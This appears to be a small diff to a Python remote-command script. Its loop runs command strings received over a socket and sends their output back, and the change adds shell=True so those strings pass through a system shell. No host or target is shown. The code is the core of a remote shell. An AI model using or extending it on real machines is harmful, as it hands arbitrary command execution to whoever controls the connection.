@@ -27,10 +27,10 @@ def main():
         # getoutput returns output stdout and stderr of executing cmd in a shell
         print(command)
         if command == "":
-            print("uh oh spaghetti o your command is empty")
+            print("command is empty")
             break
         try: 
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT)
+            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
             client.send(output.encode())
         except:
             print("uh oh spaghetti o you have an error with your input :c")
